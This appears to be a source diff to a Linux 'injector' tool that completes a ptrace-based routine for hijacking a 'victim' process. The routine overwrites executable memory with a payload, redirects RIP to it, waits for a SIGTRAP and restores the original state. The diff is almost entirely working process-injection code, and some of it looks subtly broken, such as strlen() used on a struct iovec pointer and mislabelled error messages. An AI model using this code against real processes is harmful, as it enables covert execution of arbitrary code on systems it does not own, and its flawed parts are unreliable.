@@ -73,6 +73,7 @@ int main(int argc, char* argv[])
 	pidDetails_ptr vicPID = NULL;  // Store the struct pointer for argv[1] here
 	char* userProcPID = NULL;  // Will hold char* holding /proc/<PID>/ built from user's choice
 	struct user_regs_struct oldRegs;  // Store the state of the registers here
+	struct user_regs_struct newRegs;  // Modify the registers here
 	pmStruct_ptr procMaps_ptr = NULL;  // /proc/PID/maps for argv[1]
 	pmStruct_ptr tmpPM_ptr = NULL;  // Temporary variable to print out certain mappings
 	struct iovec* localBackup = NULL;  // Local backup of the PIDs executable memory map
@@ -133,6 +134,10 @@ int main(int argc, char* argv[])
 			{
 				fprintf(stderr, "\nUnable to locate %s.\n\n", userProcPID);
 			}
+			else
+			{
+				fprintf(stdout, "[*] Located /proc/PID/\n");  // DEBUGGING
+			}
 		}
 	}
 
@@ -149,6 +154,10 @@ int main(int argc, char* argv[])
 			fprintf(stderr, "ptrace() returned errno:\t%s\n", strerror(errNum));
 			success = false;
 		}
+		else
+		{
+			fprintf(stdout, "[*] Attched to PID\n");  // DEBUGGING
+		}
 	}
 
 	// 2. Backup the current state of the processor registers
@@ -162,6 +171,11 @@ int main(int argc, char* argv[])
 			HARKLE_ERROR(injector, main, PTRACE_GETREGS failed);
 			fprintf(stderr, "ptrace() returned errno:\t%s\n", strerror(errNum));
 			success = false;
+		}
+		else
+		{
+			fprintf(stdout, "[*] Backed up PID's processor registers\n");  // DEBUGGING
+			newRegs = oldRegs;  // Starting point for new register values
 		}
 	}
 
@@ -186,12 +200,12 @@ int main(int argc, char* argv[])
 				{
 					// pmparser_print(tmpPM_ptr, 0);  // DEBUGGING
 					// fprintf(stdout, "\n");  // DEBUGGING
+				    fprintf(stdout, "[*] Found r-xp PID memory\n");  // DEBUGGING
 					break;  // Found one
 				}
 
 				tmpPM_ptr = tmpPM_ptr->next;
-			}
-			
+			}			
 		}
 	}
 
@@ -206,6 +220,10 @@ int main(int argc, char* argv[])
 		{
 			HARKLE_ERROR(injector, main, copy_remote_to_local failed);
 			success = false;
+		}
+		else
+		{
+			fprintf(stdout, "[*] Successfully backed up PID memory\n");  // DEBUGGING
 		}
 		// else
 		// {
@@ -259,6 +277,10 @@ int main(int argc, char* argv[])
 					HARKLE_ERROR(injector, main, copy_local_to_remote failed);
 					success = false;
 				}
+				else
+				{
+					fprintf(stdout, "[*] Overwrote PID memory space\n");  // DEBUGGING
+				}
 			}
 		}
 	}
@@ -266,25 +288,115 @@ int main(int argc, char* argv[])
 	// 6. Update RIP to point to the injected code
 	if (true == success)
 	{
+		// 6.1. Modify existing registers to reflect the new RIP
+		newRegs.rip = (unsigned long long)tmpPM_ptr->addr_start;
+		
+		// 6.2. Update the victim PID's process registers
+		ptRetVal = ptrace(PTRACE_SETREGS, vicPID->pidNum, NULL, &newRegs);
 
+		if (-1 == ptRetVal)
+		{
+			errNum = errno;
+			HARKLE_ERROR(injector, main, PTRACE_SETREGS failed);
+			fprintf(stderr, "ptrace() returned errno:\t%s\n", strerror(errNum));
+			success = false;
+		}
+		else
+		{
+			fprintf(stdout, "[*] Successfully updated RIP\n");  // DEBUGGING
+		}
 	}
 
 	// 7. Resume execution
 	if (true == success)
 	{
-
+		ptRetVal = ptrace(PTRACE_CONT, vicPID->pidNum, NULL, NULL);
+		
+		if (-1 == ptRetVal)
+		{
+			errNum = errno;
+			HARKLE_ERROR(injector, main, PTRACE_SETREGS failed);
+			fprintf(stderr, "ptrace() returned errno:\t%s\n", strerror(errNum));
+			success = false;
+		}
+		else
+		{
+			fprintf(stdout, "[*] PID's execution resumed\n");  // DEBUGGING
+		}
 	}
 
 	// 8. Wait until the injected code finishes running and hits a SIGTRAP
 	if (true == success)
 	{
-
+		if (-1 == waitpid(vicPID->pidNum, &errNum, WUNTRACED))
+		{
+			errNum = errno;
+			HARKLE_ERROR(injector, main, waitpid failed);
+			fprintf(stderr, "waitpid() returned errno:\t%s\n", strerror(errNum));
+			success = false;
+		}
+		else
+		{
+			fprintf(stdout, "[*] PID terminated\n");  // DEBUGGING
+			
+			if (WIFSTOPPED(errNum) && WSTOPSIG(errNum) == SIGTRAP)
+			{
+				fprintf(stdout, "[*] PID reached the SIGTRAP\n");  // DEBUGGING
+			}
+			else
+			{
+				HARKLE_ERROR(injector, main, SIGTRAP not found);
+				success = false;
+			}
+		}
 	}
 
 	// 9. Restore the process back to its original state
 	if (true == success)
 	{
+		// 9.1. Restore the registers
+		ptRetVal = ptrace(PTRACE_SETREGS, vicPID->pidNum, NULL, &oldRegs);
 
+		if (-1 == ptRetVal)
+		{
+			errNum = errno;
+			HARKLE_ERROR(injector, main, PTRACE_SETREGS failed);
+			fprintf(stderr, "ptrace() returned errno:\t%s\n", strerror(errNum));
+			success = false;
+		}
+		else
+		{
+			fprintf(stdout, "[*] Successfully restored registers\n");  // DEBUGGING
+		}
+		
+		// 9.2. Restore the mapped memory
+		if (copy_local_to_remote(vicPID->pidNum, \
+								 tmpPM_ptr->addr_start, \
+								 localBackup, \
+								 strlen(localBackup)))
+		{
+			HARKLE_ERROR(injector, main, copy_local_to_remote failed);
+			success = false;
+		}
+		else
+		{
+			fprintf(stdout, "[*] Restored PID memory space\n");  // DEBUGGING
+		}
+		
+		// 9.3. Detack from the process to resume execution
+		ptRetVal = ptrace(PTRACE_DETACH, vicPID->pidNum, NULL, NULL);
+
+		if (-1 == ptRetVal)
+		{
+			errNum = errno;
+			HARKLE_ERROR(injector, main, PTRACE_DETACH failed);
+			fprintf(stderr, "ptrace() returned errno:\t%s\n", strerror(errNum));
+			success = false;
+		}
+		else
+		{
+			fprintf(stdout, "[*] PID detached\n");  // DEBUGGING
+		}
 	}
 
 	// CLEAN UP
@@ -327,6 +439,15 @@ int main(int argc, char* argv[])
 	if (payloadFilename)
 	{
 		if (false == release_a_string(&payloadFilename))
+		{
+			HARKLE_ERROR(injector, main, release_a_string failed);
+		}
+	}
+	
+	// 6. payloadContents
+	if (payloadContents)
+	{
+		if (false == release_a_string(&payloadContents))
 		{
 			HARKLE_ERROR(injector, main, release_a_string failed);
 		}
